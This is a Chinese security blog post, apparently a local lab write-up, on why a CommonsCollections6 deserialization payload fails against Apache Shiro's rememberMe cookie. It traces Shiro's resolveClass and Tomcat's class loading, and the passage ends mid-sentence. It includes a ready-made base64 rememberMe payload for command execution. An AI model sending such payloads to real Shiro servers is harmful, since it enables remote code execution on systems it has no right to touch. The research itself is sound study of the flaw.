<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    <meta name="description" content="Hexo Theme Redefine">
    <meta name="author" content="GTL-JU">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2023/10/17/shiro反序列化打cc依赖/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="shiro反序列化打CC依赖一、前言在前面分析shiro反序列化漏洞原理的时候，我们是使用了URLDNS这条利用链进行了测试，最终成功解析了DNS地址，验证了shiro的反序列化漏洞。但是URLDNS这条利用链只能验证存在反序列化漏洞，不能造成真正的危害。这个时候我们想到了前面分析的CC链，我们能不能尝试打CC链进行命令执行。 我们这里本地验证一下： 这里尝试打一下CC6 cc6payload：">
<meta property="og:type" content="article">
<meta property="og:title" content="shiro反序列化打CC依赖">
<meta property="og:url" content="http://example.com/2023/10/17/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93CC%E4%BE%9D%E8%B5%96/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="shiro反序列化打CC依赖一、前言在前面分析shiro反序列化漏洞原理的时候，我们是使用了URLDNS这条利用链进行了测试，最终成功解析了DNS地址，验证了shiro的反序列化漏洞。但是URLDNS这条利用链只能验证存在反序列化漏洞，不能造成真正的危害。这个时候我们想到了前面分析的CC链，我们能不能尝试打CC链进行命令执行。 我们这里本地验证一下： 这里尝试打一下CC6 cc6payload：">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012093344169.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017182018239.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012100008545.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012100123790.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012104851581.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012145606453.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012145457072.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013180035440.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013180610932.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013191626160.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013194754937.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013212846905.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013212804709.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013213313733.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017163330119.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017173312082.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017173734152.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180126001.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180252466.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017180343108.png">
<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017181334967.png">
<meta property="article:published_time" content="2023-10-17T10:20:56.000Z">
<meta property="article:modified_time" content="2023-10-17T10:21:39.711Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012093344169.png">
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            shiro反序列化打CC依赖 -
        
        JU blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/assets/fonts.css">

    <!--- Font Part-->
    
    
    
        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    let Global = window.Global || {};
    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["php","java","比赛wp","环境搭建"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"JU's blog","subtitle":{"text":[],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"audios":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Status":{"path":"https://status.evanluo.top/","icon":"fa-regular fa-chart-bar"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/GTL-JU","Blog":"https://www.cnblogs.com/GTL-JU/","Friends":"/friends"}},"友链":{"icon":"fa-regular fa-link","path":"/links/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="main-content-container">

        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                JU blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        首页
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        归档
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
                                    
                                        
                                            <i class="fa-regular fa-chart-bar"></i>
                                        
                                        状态
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a href="/friends">友情链接
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/links/"  >
                                    
                                        
                                            <i class="fa-regular fa-link"></i>
                                        
                                        友链
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer">
        <ul class="drawer-navbar-list">
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                首页
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                归档
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
                             
                                
                                    <i class="fa-regular fa-chart-bar"></i>
                                
                                状态
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" href="/about">ME</a>
                            </li>
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB</a>
                            </li>
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG</a>
                            </li>
                        
                            <li class="dropdown-item flex-center">
                                <a class="dropdown-item" href="/friends">友情链接</a>
                            </li>
                        
                    
            
                
                    <li class="drawer-navbar-item flex-center">
                        <a class="" 
                        href="/links/"  >
                             
                                
                                    <i class="fa-regular fa-link"></i>
                                
                                友链
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            
            
                <div class="article-title">
                    <h1 class="article-title-regular">shiro反序列化打CC依赖</h1>
                </div>
            
                
            

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/logo.png">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">GTL-JU</span>
                            
                                <span class="author-label">Lv3</span>
                            
                        </div>
                        <div class="meta-info">
                            <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-10-17 18:20:56</span>
        <span class="mobile">2023-10-17 18:20</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2023-10-17 18:21:39</span>
            <span class="mobile">2023-10-17 18:21</span>
            <span class="hover-info">更新</span>
        </span>
    

    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java/">java</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>5.2k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>24 分钟</span>
        </span>
    
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content markdown-body">
                <h1 id="shiro反序列化打CC依赖"><a href="#shiro反序列化打CC依赖" class="headerlink" title="shiro反序列化打CC依赖"></a>shiro反序列化打CC依赖</h1><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面分析shiro反序列化漏洞原理的时候，我们是使用了URLDNS这条利用链进行了测试，最终成功解析了DNS地址，验证了shiro的反序列化漏洞。但是URLDNS这条利用链只能验证存在反序列化漏洞，不能造成真正的危害。这个时候我们想到了前面分析的CC链，我们能不能尝试打CC链进行命令执行。</p>
<p>我们这里本地验证一下：</p>
<p>这里尝试打一下CC6</p>
<p>cc6payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zVixg0JBrpiK2dg9A/aZeWdUQCGx46J5SLDy3x32GzhsfFetU6DiMHur17+g/HNUx3UCcw1oVWa5ycOFfJjYnblZWDFz2bHW5LM98vMOg+cPOJMTeUFB/gT8clNJypWF1hg6Kj3geBSKPkfxwmIyXzPNQIHi8YGz03XP8LiklkW1ezRc716wbtsiNubB1qgMeRcPb8GDBlmEcjYJ8sL6MEikI46pPxr6BdYjU7L7dHzNj5N/+ESHmSW/ruNbT/6FQ+9jsJpnV+UoUn2/xwFPv9iRfk/XUxUIORpJd09dZVUuBoWKy016rdCfAA5JidiQxOLS9t3g3EFlpet3XoqPQWz0/mPSFnnGp2tYlPKrHAIuUq+6Z+8TzUBSu0rpPLfL+yfQ4OSyYv9xACLS2wiOxnKqnSr1r6dCJ6r1PfPGIbiUDODgWj482U16Liug5m01rkN9lq31BWcC8T3SkRVL3P5SqyxywYNZQ3fiTKwFIm/i1lAZZl5w/gn7PR7a9tcYKgLXiYdW6Y5giymxcApmkt6Pzm6eYCORLkE7FPqlWA4xm8TV4IiFPH+guaatt20WD+aNOACKv0ar6zBYLLlsst9W0b+gqDRSQeOeNaLqXbJxCwhiw4Vp6Ix96lEZDx+ba7UwCRVXI3jiYexCJha5kf4BfKkEVmDe7DxmNQ47HIS+Z8avHrvoOYtnwl1SlNHPIutCGGWm8nYkITLhfzArj/vNggLw8GuiN7Kd8VB006eV+TbzWKy5uF1S4HjsvfmV2yryvpODStHfpAT9r3Gtq7vFu3tF6FtZIWKfy8/t1f6idBVJCyG0O4J3ITD2r/e8llHeQhLC+pXTDFkYXBLAdt0OGJXEeFa688w/wbQPimqQHPjm7FI8NmfTP+x/tnnKdEjZyu+XqGml4mq2bsGoBDoebi6PrJ1G91Bu0qIyuLTfIr9f8ViJlK9MyR2laff5TK+mIP9PFnJLXxz25ZgJct9m8f7GOMO4O95EBcIFaungzcos5cad0Q721gMZFas8i2RybHLiYFlfZsRugTsPD/WxVSCnXJiBzn3F0GOYJYuapBkmw8eyJDgXAJF2fmzFxhzSx0VFgatHUWRNeaR+Rz9OOP+DjltqAad4U42O1OndlVbR1sPkij88IOz35aTx//Rn7PLgW8oOV813gxOcPREnLbkHLjda2Ih+dxfPHzYpT5WLqA0dmlWDoAp838wGqw2dndj4hLz6wWtMEqWrsWBiqZEho/x1vaZVnjkJvY2CZz9LA3Fl2FKDbkTRgsyUm1C3HDxg8R+7LkREzVi/5DhnRioDPbrRmgqj7vjtpUIJZttuStkcDlndd1QKy3aGoLCYxwvoCPoB6nmtfKcYFppbd+F8JkqBR7aoXNPdyJdPwLzt8K3d3vMcVFrerVZJS8OLJC4E6NbCqi7abjOFw7QL2xL2VXECK2QA6nOUJ72nFgjHHXn0s1/FsIwKVd3LwT26PnT6RLMF4RpSdiYeo9TfytNiYkczgcIxihWRbEM+TDaZWBsoNtXj8GGx9BTEIQZquutgrnU9sLHeZdMC4A==</span><br></pre></td></tr></table></figure></div>

<p>替换掉rememberMe的值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012093344169.png"
                      alt="image-20231012093344169"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231017182018239.png"
                      alt="image-20231017182018239"
                ></p>
<p>可以看到当我们将替换了rememberMe的请求包发送给服务器，在服务器的日志中出现了报错</p>
<p>我们从日志中可以看到这里是反序列化失败了，反序列化失败的原因是找不到<code>Lorg.apache.commons.collections.Transformer</code>这个类。</p>
<h1 id="二、shiro无法正常打CC依赖分析"><a href="#二、shiro无法正常打CC依赖分析" class="headerlink" title="二、shiro无法正常打CC依赖分析"></a>二、shiro无法正常打CC依赖分析</h1><p>报错是在<code>ObjectInputStream</code></p>
<p>我们在这里打一个断点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012100008545.png"
                      alt="image-20231012100008545"
                ></p>
<p>重新发包，触发断点</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012100123790.png"
                      alt="image-20231012100123790"
                ></p>
<p>可以看到<code>ClassResolvingObjectInputStream</code> 继承了ObjectInputStream</p>
<p>继续向下面看</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return ClassUtils.forName(osc.getName());</span><br><span class="line">        &#125; catch (UnknownClassException e) &#123;</span><br><span class="line">            throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到<code>ClassResolvingObjectInputStream</code> 还重写了<code>resolveClass</code>方法</p>
<p>在ObjectInputStream类中原本的resolveClass方法是：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012104851581.png"
                      alt="image-20231012104851581"
                ></p>
<p>在原本<code>ObjectInputStrem</code>中的返回的是Class.forName</p>
<p>但是在shiro重写的resolveClass方法中返回的却是<code>ClassUtils.forName</code></p>
<p>这里跟进到<code>ClassUtils.forName</code>方法</p>
<p>到这里我们可以看到最终是使用loadClass来加载类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012145606453.png"
                      alt="image-20231012145606453"
                ></p>
<p>在这里默认是使用的是<code>THREAD_CL_ACCESSOR.loadClass</code>来进行加载</p>
<p>如果加载不成功则会使用<code>CLASS_CL_ACCESSOR.loadClass</code>来进行加载</p>
<p>如果还是加载不成功则会使用<code>SYSTEM_CL_ACCESSOR.loadClass</code>来进行加载</p>
<p>THREAD_CL_ACCESSOR.loadClass返回当前线程上下面的ClassLoader</p>
<p>在Tomcat中间件中，返回的当前线程上下文的CLassLoader是<code>ParallelWebappClassLoader</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231012145457072.png"
                      alt="image-20231012145457072"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013180035440.png"
                      alt="image-20231013180035440"
                ></p>
<p>可以看到这里获取到的加载器是ParallelWebappClassLoader</p>
<p>调用了loadclass方法进行加载</p>
<p>我们这里跟进到WebappClassLoaderBase类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013180610932.png"
                      alt="image-20231013180610932"
                ></p>
<p>我们可以看到webappCLassLoaderBase类继承于URLCLassLoader</p>
<p>loadclass是webappClassLoaderBase类加载的核心实现源码</p>
<p>其实到这里就是分析tomcat的类加载过程了</p>
<p>我们这里跟进到loadclass方法分析一下tomcat的类加载机制</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// (0) Check our previously loaded local class cache</span><br><span class="line">            clazz = findLoadedClass0(name);</span><br><span class="line">            if (clazz != null) &#123;</span><br><span class="line">                if (log.isDebugEnabled())</span><br><span class="line">                    log.debug(&quot;  Returning class from cache&quot;);</span><br><span class="line">                if (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                return clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // (0.1) Check our previously loaded class cache</span><br><span class="line">            clazz = findLoadedClass(name);</span><br><span class="line">            if (clazz != null) &#123;</span><br><span class="line">                if (log.isDebugEnabled())</span><br><span class="line">                    log.debug(&quot;  Returning class from cache&quot;);</span><br><span class="line">                if (resolve)</span><br><span class="line">                    resolveClass(clazz);</span><br><span class="line">                return clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>根据loadclas的代码我们可以看到首先是调用 findLoadedClass0()方法检查之前加载的本地类缓存，即就是检查当前要加载的类是否已经被WebappClassLoader加载过。其实也就是从tomcat的缓存中找。</p>
<p>如果再本地类加载缓存中没有加载成功，则会调用findLoadedClass()方法检查系统类加载器的 cache 缓存中查找是否加载过。也就是从JDK缓存中找。</p>
<p>如果还是没有加载到</p>
<p>我们继续向下看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231013191626160.png"
                      alt="image-20231013191626160"
                ></p>
<p>可以看到这里调用<code>getJavaseClassLoader()</code>获取一个类加载器<br>其实这里使用的也就是我们再动态加载字节码中分析的双亲委派机制的中的ExtClassLoader 但是这里不同的是Tomcat 的 WebAppClassLoader 并没有先使用 AppClassLoader 来加载类，而是直接使用了 ExtClassLoader 来加载类。不过 ExtClassLoader 依然遵循双亲委派，它会使用 Bootstrap ClassLoader 来对类进行加载，保证了 Jre 里面的核心类不会被重复加载。比如在 Web 中加载一个 Object 类。WebAppClassLoader → ExtClassLoader → BootstrapClassLoader，这个加载链，就保证了 Object 不会被重复加载。</p>
<p>然后我们继续往下面分析，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">boolean delegateLoad = delegate || filter(name, true);</span><br><span class="line"></span><br><span class="line">           // (1) Delegate to our parent if requested</span><br><span class="line">           if (delegateLoad) &#123;</span><br><span class="line">               if (log.isDebugEnabled())</span><br><span class="line">                   log.debug(&quot;  Delegating to parent classloader1 &quot; + parent);</span><br><span class="line">               try &#123;</span><br><span class="line">                   clazz = Class.forName(name, false, parent);</span><br><span class="line">                   if (clazz != null) &#123;</span><br><span class="line">                       if (log.isDebugEnabled())</span><br><span class="line">                           log.debug(&quot;  Loading class from parent&quot;);</span><br><span class="line">                       if (resolve)</span><br><span class="line">                           resolveClass(clazz);</span><br><span class="line">                       return clazz;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                   // Ignore</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           // (2) Search local repositories</span><br><span class="line">           if (log.isDebugEnabled())</span><br><span class="line">               log.debug(&quot;  Searching local repositories&quot;);</span><br><span class="line">           try &#123;</span><br><span class="line">               clazz = findClass(name);</span><br><span class="line">               if (clazz != null) &#123;</span><br><span class="line">                   if (log.isDebugEnabled())</span><br><span class="line">                       log.debug(&quot;  Loading class from local repository&quot;);</span><br><span class="line">                   if (resolve)</span><br><span class="line">                       resolveClass(clazz);</span><br><span class="line">                   return clazz;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">               // Ignore</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           // (3) Delegate to parent unconditionally</span><br><span class="line">           if (!delegateLoad) &#123;</span><br><span class="line">               if (log.isDebugEnabled())</span><br><span class="line">                   log.debug(&quot;  Delegating to parent classloader at end: &quot; + parent);</span><br><span class="line">               try &#123;</span><br><span class="line">                   clazz = Class.forName(name, false, parent);</span><br><span class="line">                   if (clazz != null) &#123;</span><br><span class="line">                       if (log.isDebugEnabled())</span><br><span class="line">                           log.debug(&quot;  Loading class from parent&quot;);</span><br><span class="line">                       if (resolve)</span><br><span class="line">                           resolveClass(clazz);</span><br><span class="line">                       return clazz;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                   // Ignore</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></div>

<p>通过代码我们可以分析到，如果前面都没有加载到，通过filter()检查类是否在定义的名单范围内，如果在的话则遵循双亲委派机制，使用Class.forName()加载类。由于delegate默认为false，并且符合filter()检查的类比较少，所以可以认为Tomcat在实现大多数类的加载的时候并不遵循双亲委派机制，也就是一般会跳过这一步。</p>
<p>也就是说</p>
